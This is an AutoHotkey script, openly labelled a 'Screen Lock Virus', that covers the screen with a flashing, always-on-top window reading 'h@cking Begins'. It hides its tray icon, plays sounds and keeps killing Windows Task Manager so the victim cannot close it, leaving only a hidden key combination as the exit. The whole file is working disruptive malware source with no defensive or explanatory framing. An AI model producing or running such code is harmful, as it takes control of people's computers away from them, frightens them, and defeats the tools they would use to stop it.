/*
  Screen Lock Virus

  Description:-
	Locks The Computer Screen
*/

#NoEnv
#SingleInstance Force
#Persistent
#NoTrayIcon

SetBatchLines -1 ;For Speed

;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Code Begins

;Gui Variables
Width	:=	A_ScreenWidth  + 20
Height	:=	A_ScreenHeight + 20

X	:=	(A_ScreenWidth  / 2) - 280
Y	:=	(A_ScreenHeight / 2) - 75

;
x1	:= X + 100
y1	:= Y + 89

;Create a Gui
Gui -SysMenu +AlwaysOnTop +LastFound
Gui Font, s50
Gui Add, Text, c000000 x%X% y%Y%, h@cking Begins.....
Gui Show, w%Width% h%Height%, Lock3d

amitID := WinExist()

WinSet, Transparent, 175, Lock3d

SetTimer, Check, 250
SetTimer, Color, 500

Return	 ;End of Auto Execute Section
;_____________________________________________

Color:
	Random, Rand, -99999, 9999999
	Gui, Color, %Rand%
	Soundplay, *-1
Return

Check:
	if WinExist("Windows Task Manager")
	{
		WinKill, ahk_class #32770
		WinSet AlwaysOnTop, On, Lock3d
	}
Return

q & m::
Exitapp
